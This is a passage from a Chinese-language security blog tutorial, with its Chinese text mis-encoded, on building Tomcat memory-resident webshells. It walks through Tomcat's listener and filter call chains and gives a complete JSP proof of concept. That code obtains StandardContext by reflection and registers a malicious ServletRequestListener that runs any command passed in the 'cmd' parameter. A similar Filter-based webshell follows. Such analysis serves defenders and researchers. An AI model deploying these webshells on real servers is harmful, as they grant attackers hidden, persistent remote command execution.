(org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p><code>StandardContext#fireRequestInitEvent</code>è°ƒç”¨äº†æˆ‘ä»¬çš„Listenerï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹å…¶å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">fireRequestInitEvent</span><span class="hljs-params">(ServletRequest request)</span> &#123;<br> <br>        Object instances[] = getApplicationEventListeners();<br> <br>        <span class="hljs-keyword">if</span> ((instances != <span class="hljs-literal">null</span>) &amp;&amp; (instances.length &gt; <span class="hljs-number">0</span>)) &#123;<br> <br>            <span class="hljs-type">ServletRequestEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestEvent</span>(getServletContext(), request);<br> <br>            <span class="hljs-keyword">for</span> (Object instance : instances) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> ServletRequestListener)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">listener</span> <span class="hljs-operator">=</span> (ServletRequestListener) instance;<br> <br>                <span class="hljs-keyword">try</span> &#123;<br>                    listener.requestInitialized(event);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.requestListener.requestInit&quot;</span>,<br>                            instance.getClass().getName()), t);<br>                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å…³é”®ä»£ç æœ‰ä¸¤å¤„ï¼Œé¦–å…ˆé€šè¿‡<code>getApplicationEventListeners()</code>è·å–ä¸€ä¸ªListeneræ•°ç»„ï¼Œç„¶åéå†æ•°ç»„è°ƒç”¨<code>listener.requestInitialized(event)</code>æ–¹æ³•è§¦å‘Listenerã€‚è·Ÿè¿›<code>getApplicationEventListeners()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object[] getApplicationEventListeners() &#123;<br>        <span class="hljs-keyword">return</span> applicationEventListenersList.toArray();<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°Listenerå®é™…ä¸Šæ˜¯å­˜å‚¨åœ¨*<code>applicationEventListenersList</code>*å±æ€§ä¸­çš„</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-15.png" alt="img2"></p><p>å¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>StandardContext#addApplicationEventListener()</code>æ–¹æ³•æ¥æ·»åŠ Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addApplicationEventListener</span><span class="hljs-params">(Object listener)</span> &#123;<br>        applicationEventListenersList.add(listener);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="è·å–StandardContextç±»"><a href="#è·å–StandardContextç±»" class="headerlink" title="è·å–StandardContextç±»"></a>è·å–StandardContextç±»</h4><p>ä¸‹é¢çš„å·¥ä½œå°±æ˜¯è·å–<code>StandardContext</code>ç±»äº†ï¼Œåœ¨<code>StandardHostValve#invoke</code>ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶é€šè¿‡requestå¯¹è±¡æ¥è·å–<code>StandardContext</code>ç±»</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-16.png" alt="img3"></p><p>åŒæ ·åœ°ï¼Œç”±äºJSPå†…ç½®äº†requestå¯¹è±¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨åŒæ ·çš„æ–¹å¼æ¥è·å–</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å¦ä¸€ç§è·å–æ–¹å¼å¦‚ä¸‹</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br>%&gt;<br> <br></code></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªæ¶æ„çš„Listener</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>æœ€åæ·»åŠ ç›‘å¬å™¨</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>    context.addApplicationEventListener(shell_Listener);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´POC"><a href="#å®Œæ•´POC" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><p>è‡³æ­¤æˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºListenerå‹å†…å­˜é©¬çš„å®ç°æ­¥éª¤</p><ol><li>è·å–StandardContextä¸Šä¸‹æ–‡</li><li>å®ç°ä¸€ä¸ªæ¶æ„Listener</li><li>é€šè¿‡StandardContext#addApplicationEventListeneræ–¹æ³•æ·»åŠ æ¶æ„Listener</li></ol><p>å®Œæ•´POCå¦‚ä¸‹</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>           <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>           <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   Runtime.getRuntime().exec(cmd);<br>               &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                   e.printStackTrace();<br>               &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                   n.printStackTrace();<br>               &#125;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>    context.addApplicationEventListener(shell_Listener);<br>%&gt;<br></code></pre></td></tr></table></figure><p>è®¿é—®Listener.jsp</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-18.png" alt="img4"></p><p>æ­¤æ—¶Tomcatå·²ç»æ·»åŠ äº†æˆ‘ä»¬æ¶æ„çš„Listenerï¼Œè®¿é—®ä»»æ„è·¯ç”±å³å¯è§¦å‘</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-17.png" alt="img5"></p><h3 id="Filterå‹"><a href="#Filterå‹" class="headerlink" title="Filterå‹"></a>Filterå‹</h3><p>ä»¿ç…§Listenerå‹å†…å­˜é©¬çš„å®ç°æ€è·¯ï¼Œæˆ‘ä»¬åŒæ ·èƒ½å®ç°Filterå‹å†…å­˜é©¬ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨Servletå®¹å™¨ä¸­ï¼ŒFilterçš„è°ƒç”¨æ˜¯é€šè¿‡FilterChainå®ç°çš„</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/image.png" alt="img6"></p><p>åŒæ ·åœ°ï¼Œæˆ‘ä»¬å…ˆæ¥å®ç°ä¸€ä¸ªæ¶æ„çš„Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-19.png" alt="img7"></p><h4 id="Filterè°ƒç”¨åˆ†æ"><a href="#Filterè°ƒç”¨åˆ†æ" class="headerlink" title="Filterè°ƒç”¨åˆ†æ"></a>Filterè°ƒç”¨åˆ†æ</h4><p>æˆ‘ä»¬åœ¨doFilterå¤„æ‰“ä¸Šæ–­ç‚¹ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">doFilter:<span class="hljs-number">11</span>, Shell_Filter (Filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>invoke:<span class="hljs-number">197</span>, StandardWrapperValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">97</span>, StandardContextValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)<br>invoke:<span class="hljs-number">135</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>ApplicationFilterChain#internalDoFilter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">                                  ServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br> <br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++];<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> filterConfig.getFilter();<br> <br>                <span class="hljs-keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(<br>                        filterConfig.getFilterDef().getAsyncSupported())) &#123;<br>                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);<br>                &#125;<br>                <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>                    <span class="hljs-type">Principal</span> <span class="hljs-variable">principal</span> <span class="hljs-operator">=</span><br>                        ((HttpServletRequest) req).getUserPrincipal();<br> <br>                    Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;req, res, <span class="hljs-built_in">this</span>&#125;;<br>                    SecurityUtil.doAsPrivilege (<span class="hljs-string">&quot;doFilter&quot;</span>, filter, classType, args, principal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    filter.doFilter(request, response, <span class="hljs-built_in">this</span>);<br>                &#125;<br>            &#125; <br>...<br>    &#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>filter.doFilter()</code>ï¼Œè€Œ<code>filter</code>æ˜¯é€šè¿‡<code>filterConfig.getFilter()</code>å¾—åˆ°çš„ï¼Œ<code>filterConfig</code>å®šä¹‰å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> ApplicationFilterConfig[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>[<span class="hljs-number">0</span>];<br> <br>...<br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> filters[pos++]<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“ï¼Œä¸€ä¸ªfilterConfigå¯¹åº”ä¸€ä¸ªFilterï¼Œç”¨äºå­˜å‚¨Filterçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚è¿™é‡Œçš„*<code>filters</code><em>å±æ€§æ˜¯ä¸€ä¸ªApplicationFilterConfigæ•°ç»„ã€‚æˆ‘ä»¬æ¥å¯»æ‰¾ä¸€ä¸‹</em><code>ApplicationFilterChain.filters</code>*å±æ€§åœ¨å“ªé‡Œè¢«èµ‹å€¼ã€‚</p><p>åœ¨<code>StandardWrapperValve#invoke()</code>æ–¹æ³•ä¸­ï¼Œé€šè¿‡<code>ApplicationFilterFactory.createFilterChain()</code>æ–¹æ³•åˆå§‹åŒ–äº†ä¸€ä¸ª<code>ApplicationFilterChain</code>ç±»</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-20.png" alt="img8"></p><p>æˆ‘ä»¬è·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">            Wrapper wrapper, Servlet servlet)</span> &#123;<br> <br>        ...<br>        <span class="hljs-comment">// Request dispatcher in use</span><br>        filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br> <br>        filterChain.setServlet(servlet);<br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br> <br>        <span class="hljs-comment">// Acquire the filter mappings for this Context</span><br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<br>        FilterMap filterMaps[] = context.findFilterMaps();<br> <br>        ...<br> <br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<br> <br>        <span class="hljs-comment">// Add the relevant path-mapped filters to this filter chain</span><br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123;<br>            <br>            ...<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig)<br>                    context.findFilterConfig(filterMap.getFilterName());<br>            ...<br> <br>            filterChain.addFilter(filterConfig);<br>        &#125;<br> <br>        ...<br> <br>        <span class="hljs-comment">// Return the completed filter chain</span><br>        <span class="hljs-keyword">return</span> filterChain;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘çœç•¥äº†å‡½æ•°ä¸­ä¸€äº›ä¸é‡è¦çš„åˆ¤æ–­ï¼Œä»createFilterChainå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ¸…æ™°åœ°çœ‹åˆ°filterChainå¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹</p><ol><li>é¦–å…ˆé€šè¿‡<code>filterChain = new ApplicationFilterChain()</code>åˆ›å»ºä¸€ä¸ªç©ºçš„filterChainå¯¹è±¡</li><li>ç„¶åé€šè¿‡<code>wrapper.getParent()</code>å‡½æ•°æ¥è·å–<code>StandardContext</code>å¯¹è±¡</li><li>æ¥ç€è·å–<code>StandardContext</code>ä¸­çš„<code>FilterMaps</code>å¯¹è±¡ï¼Œ<code>FilterMaps</code>å¯¹è±¡ä¸­å­˜å‚¨çš„æ˜¯å„Filterçš„åç§°è·¯å¾„ç­‰ä¿¡æ¯</li><li>æœ€åæ ¹æ®Filterçš„åç§°ï¼Œåœ¨<code>StandardContext</code>ä¸­è·å–<code>FilterConfig</code></li><li>é€šè¿‡<code>filterChain.addFilter(filterConfig)</code>å°†ä¸€ä¸ª<code>filterConfig</code>æ·»åŠ åˆ°<code>filterChain</code>ä¸­</li></ol><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-23.png" alt="img9"></p><p>FilterMapså¯¹è±¡</p><p>å¯ä»¥çœ‹åˆ°åœ¨<code>ApplicationFilterChain#addFilter</code>æ–¹æ³•ï¼ŒfilterConfigè¢«æ·»åŠ åˆ°filtersä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">addFilter</span><span class="hljs-params">(ApplicationFilterConfig filterConfig)</span> &#123;<br> <br>        <span class="hljs-comment">// Prevent the same filter being added multiple times</span><br>        <span class="hljs-keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;<br>            <span class="hljs-keyword">if</span>(filter==filterConfig) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span> (n == filters.length) &#123;<br>            ApplicationFilterConfig[] newFilters =<br>                <span class="hljs-keyword">new</span> <span class="hljs-title 